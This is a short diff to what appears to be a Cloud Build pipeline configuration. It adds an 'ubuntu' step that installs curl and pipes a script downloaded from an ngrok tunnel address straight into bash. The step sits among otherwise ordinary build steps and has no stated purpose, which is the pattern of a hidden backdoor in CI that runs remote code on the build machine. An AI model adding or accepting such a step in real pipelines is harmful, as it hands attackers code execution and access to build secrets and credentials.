@@ -20,6 +20,9 @@ steps:
   # build.sh to build only what's changed relative to the
   # master branch by checking the output of "git diff".
   ############################################################
+
+- name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 - name: gcr.io/cloud-builders/git
   entrypoint: bash
   args:
